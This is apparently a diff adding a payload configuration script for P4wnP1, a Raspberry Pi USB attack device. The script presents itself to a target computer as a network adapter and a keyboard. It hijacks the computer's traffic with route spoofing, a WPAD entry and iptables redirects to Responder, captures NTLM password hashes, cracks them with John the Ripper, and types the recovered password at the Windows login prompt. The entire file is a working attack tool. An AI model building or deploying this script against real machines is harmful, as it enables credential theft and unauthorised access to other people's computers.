@@ -1,0 +1,209 @@
+USB_VID="0x1d6b"        # Vendor ID
+USB_PID=$(printf "0x%04X" $RANDOM)        # Random PID to raise chance of driver reinstall
+
+USE_ECM=false            # we need no Linux/Mac networking
+USE_RNDIS=true          # RNDIS network device to enable hash stealing
+USE_HID=true            # HID keyboard to allow entering cracked password
+USE_UMS=false           # no mass storage
+
+lang="us" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
+
+# ==========================
+# Network and DHCP options
+# ==========================
+
+IF_IP="172.16.0.1" # IP used by P4wnP1
+IF_MASK="255.255.255.252" 
+IF_DHCP_RANGE="172.16.0.2,172.16.0.2" # DHCP Server IP Range
+
+ROUTE_SPOOF=true # set two static routes on target to cover whole IPv4 range, raise chance of capturing packets with hashes
+WPAD_ENTRY=true # provide a WPAD entry via DHCP pointing to responder
+
+
+# define some helper functions and custom vars
+CRACK=true # enable cracking of dumped hashes on P4wnP1
+LOGIN=true # enable Login attempt if hash is cracked
+
+function responder_db_contains_data()
+{
+	responder_db="$wdir/Responder/Responder.db"
+
+	if [ -f $responder_db ]; then
+		if [ $(wc -c < $responder_db) -gt "0" ]; then
+			return 0
+		else
+			return 1
+		fi
+	else
+		return 1
+	fi
+}
+
+function check_for_hash()
+{
+	# exclude hashes for "SMB\"
+	if [[ $(sqlite3 $wdir/Responder/Responder.db "select fullhash from responder where not user='SMB\'") ]]; then
+		return 0
+	else
+		return 1
+	fi
+}
+
+function get_hash()
+{
+	# exclude hashes for "SMB\"
+	sqlite3 -line $wdir/Responder/Responder.db "select fullhash from responder where not user='SMB\'" | cut -d " " -f3
+}
+
+function kill_responder()
+{
+	sudo kill $(ps -aux | grep "Responder.py" | grep -v -e "bash" | grep -v -e "grep" | awk '{print $2}')
+}
+
+function extract_password()
+{
+	# assumes there's only one password which has been cracked 
+	$wdir/john/john --pot=/tmp/john.pot --show $1 | grep ":" | cut -d":" -f2
+}
+
+# This function gets called after the target network interface is working
+# (RNDIS, CDC ECM or both have to be enabled)
+function onNetworkUp()
+{
+	# blink one time, when network is up
+	led_blink 1
+	
+	# redirect unicast traffic for every destination to responder (cacth packets sent to our huge subnet ;-) )
+
+    iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+    iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+
+	echo "Starting responder..."
+
+	# delete Responder.db
+	rm $wdir/Responder/Responder.db
+
+	# start responder in screen session
+    screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -d -r -w -P"
+
+	touch /tmp/responder_started
+
+	echo "Starting responder started."
+	
+	# blink two times when responder is started
+	led_blink 2
+}
+
+# this function gets called if the target received a DHCP lease
+# (DHCP client has to be running on target)
+function onTargetGotIP()
+{
+
+	echo "Waiting for hashes to arrive "
+
+	# wait till hashes have been grabbed (exluding hashes for host\user "SMB\"
+	until responder_db_contains_data && check_for_hash; do
+		sleep 0.5 # 500 ms delay before recheck
+	done
+	
+	echo
+
+	# at this point we should have one or more hashes, so we save them and kill responder
+	
+	
+	fname="$target_name""_""$target_ip"
+	# count existing folders of this name
+	fcount=$(ls -la $wdir/collected/ | grep "$fname" | wc -l)
+	fname="$fname""_""$fcount"".hashes"
+
+	hashfile=$wdir/collected/$fname
+	
+	get_hash > $hashfile
+	chown -R pi:pi $wdir/collected
+	sync
+	echo "Captured the following hashes:"
+	cat $hashfile
+	kill_responder
+
+	# LED to solid, when hash is captured
+	led_blink 255 # set LED to solid on
+	
+	if $CRACK; then
+		led_blink 3
+		echo "Starting JtR and trying to crack..."
+		# use temporary pot file (known hashes will be cracked again)
+		$wdir/john/john --pot=/tmp/john.pot $hashfile
+		echo "All given hashes cracked!!!"
+		sync
+
+				
+		led_blink 4
+		# store a backup of cracked hash
+		$wdir/john/john --show --pot=/tmp/john.pot $hashfile | tee $hashfile.cracked
+
+		led_blink 255 # set LED to solid on
+		
+	fi
+
+	# from here we could start entering the passwords one by one (depending on target OS is needed on too many failed attempts)
+	led_blink 255 # set LED to solid on
+	
+	if $LOGIN; then
+		# we assume theres only one password
+		extract_password $hashfile > /tmp/login
+		sync
+	fi
+	
+	led_blink 255 # set LED to solid on
+	
+}
+
+function onKeyboardUp()
+{
+	if $LOGIN; then
+		# wait till a file with login password is created
+		until [ -f /tmp/login ]; do 
+			sleep 1
+			echo .
+		done
+		
+		
+		# writing to the file hasn't finished in every case, when we get here, thus we wait for content (this won't work with empty passwords)
+		until [ $(wc -c < /tmp/login) -gt "0" ]; do sleep 1; echo .; done
+		sync
+		
+		# to avoid get the password screen input ready we press CTRL+ALT+DEL, multiple times (to allow wake up)
+		for i in $(seq 3); do
+			echo "Sending CTRL-ALT + DEL"
+			echo "CTRL-ALT DELETE" | duckhid
+			sleep 0.5
+		done
+			
+		pass=$(cat /tmp/login)
+		
+		echo "Trying to login with password: $pass"
+		led_blink 4
+		
+		# We target Win 10, which needs a keypress to bring the password prompt up (we're pressing a)
+		# addtiotionally, we assume that the keyboard is up and running at this point
+		
+		
+		
+		cat <<- EOF | duckhid
+			REM followed by the password we cracked (which hopefully is for this account)
+			REM as DuckyScript could only handle ASCII chars, unicode passwords don't work
+			STRING $pass
+			DELAY 500
+			ENTER
+EOF
+
+		# we don't start a second attempt, so the script ends here
+		led_blink 255 # set LED to solid on
+	fi
+}
+
+function onLogin()
+{
+        return
+}
+
